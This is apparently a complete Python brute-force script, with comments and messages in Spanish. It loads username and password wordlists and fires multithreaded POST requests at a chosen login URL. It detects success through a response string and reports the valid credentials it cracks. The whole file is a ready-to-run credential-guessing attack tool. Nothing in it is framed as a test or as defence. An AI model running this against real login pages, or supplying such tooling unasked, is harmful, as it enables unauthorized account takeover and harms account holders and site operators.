import argparse
import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

DEFAULT_TIMEOUT = 5
DEFAULT_THREADS = 10


def handle_interrupt(signum, frame):
    """
    Maneja interrupciones como Ctrl+C para salir limpiamente.
    """
    print("\n[!] Interrupción detectada. Terminando el script...")
    sys.exit(1)


signal.signal(signal.SIGINT, handle_interrupt)


def check_server_status(url):
    """
    Verifica si la página está disponible.
    """
    try:
        response = requests.get(url, timeout=DEFAULT_TIMEOUT)
        if response.status_code == 200:
            print("[+] Página disponible: El servidor responde correctamente.")
            return True
        else:
            print(f"[-] Código HTTP inesperado: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"[-] Error al conectar con el servidor: {e}")
        return False


def try_credentials(url, username, password, success_string):
    """
    Intenta una combinación de usuario y contraseña.
    """
    data = {"username": username, "password": password}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        response = requests.post(
            url, data=data, headers=headers, timeout=DEFAULT_TIMEOUT)
        if success_string in response.text:
            return True
    except requests.RequestException:
        pass
    return False


def brute_force_thread(url, username, passwords, success_string, pbar):
    """
    Probar múltiples contraseñas para un usuario en un hilo.
    """
    for password in passwords:
        if try_credentials(url, username, password, success_string):
            print(
                f"\n[+] Credenciales válidas: Usuario='{username}', Contraseña='{password}'")
            return True
        pbar.update(1)
    return False


def brute_force(url, users, passwords, success_string):
    """
    Realiza un ataque de fuerza bruta usando threads.
    """
    total_combinations = len(users) * len(passwords)
    print(f"[*] Total de combinaciones: {total_combinations}")

    with tqdm(total=total_combinations, desc="Progresando", unit="combinación") as pbar:
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
            futures = [
                executor.submit(brute_force_thread, url, user,
                                passwords, success_string, pbar)
                for user in users
            ]
            for future in futures:
                if future.result():
                    executor.shutdown(wait=False)
                    return


def main():
    parser = argparse.ArgumentParser(
        description="Script de fuerza bruta para login con multithreading y barra de progreso.",
        epilog="Ejemplo: python3 script.py -u http://example.com/login -us usuarios.txt -pw passwords.txt -s 'My Account'"
    )
    parser.add_argument("-u", "--url", required=True,
                        help="URL del login objetivo.")
    parser.add_argument("-us", "--user-file", required=True,
                        help="Archivo con la lista de usuarios.")
    parser.add_argument("-pw", "--password-file", required=True,
                        help="Archivo con la lista de contraseñas.")
    parser.add_argument("-s", "--success-string", required=True,
                        help="Cadena esperada para un login exitoso.")

    args = parser.parse_args()

    print("[*] Verificando el estado del servidor...")
    if not check_server_status(args.url):
        print("[-] El servidor no está disponible. Saliendo...")
        sys.exit(1)

    try:
        with open(args.user_file, "r") as users_file:
            users = users_file.read().splitlines()

        with open(args.password_file, "r") as passwords_file:
            passwords = passwords_file.read().splitlines()

        print("[*] Iniciando ataque de fuerza bruta...")
        brute_force(args.url, users, passwords, args.success_string)
    except FileNotFoundError as e:
        print(f"[-] Error al abrir archivo: {e}")
    except Exception as e:
        print(f"[-] Error inesperado: {e}")


if __name__ == "__main__":
    main()
